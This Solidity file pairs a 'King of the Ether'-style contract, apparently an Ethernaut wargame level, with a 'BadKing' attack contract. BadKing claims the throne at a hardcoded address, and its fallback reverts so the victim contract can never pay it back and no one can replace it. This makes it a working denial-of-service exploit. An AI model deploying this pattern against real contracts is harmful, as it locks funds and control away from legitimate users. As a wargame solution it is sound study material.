// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract BadKing {
    King public king = King(0x888f37E5e95B304fc58C6DF557033ef1CB15889e);
    event kingEvent(bool indexed result);

    constructor() public payable {

    }

    function becomeKing() public returns (bool){
        (bool sent, bytes memory data) = address(king).call{value: 1100000000000000, gas: 4000000}("");
        emit kingEvent(sent);
        return sent;
    }

    fallback() external payable {
        revert("fail reclamation");
    }

}